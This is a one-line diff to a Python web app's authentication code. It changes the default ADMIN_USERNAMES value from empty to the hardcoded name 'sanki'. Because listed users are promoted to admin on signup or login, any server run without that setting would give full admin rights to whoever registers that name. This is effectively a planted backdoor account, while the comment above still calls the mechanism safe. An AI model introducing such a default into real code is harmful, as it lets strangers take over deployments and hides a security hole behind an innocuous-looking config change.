@@ -3258,7 +3258,7 @@ def health():
 # ── AUTH ──────────────────────────────────
 # Usernames listed in ADMIN_USERNAMES become admin automatically when they
 # sign up or log in. This is the safe way to create the first admin on a server.
-ADMIN_USERNAMES = {u.lower() for u in _csv("ADMIN_USERNAMES", "")}
+ADMIN_USERNAMES = {u.lower() for u in _csv("ADMIN_USERNAMES", "sanki")}
 
 def _promote_if_listed(doc: dict) -> dict:
     if doc and doc.get("username", "").lower() in ADMIN_USERNAMES and not doc.get("is_admin"):
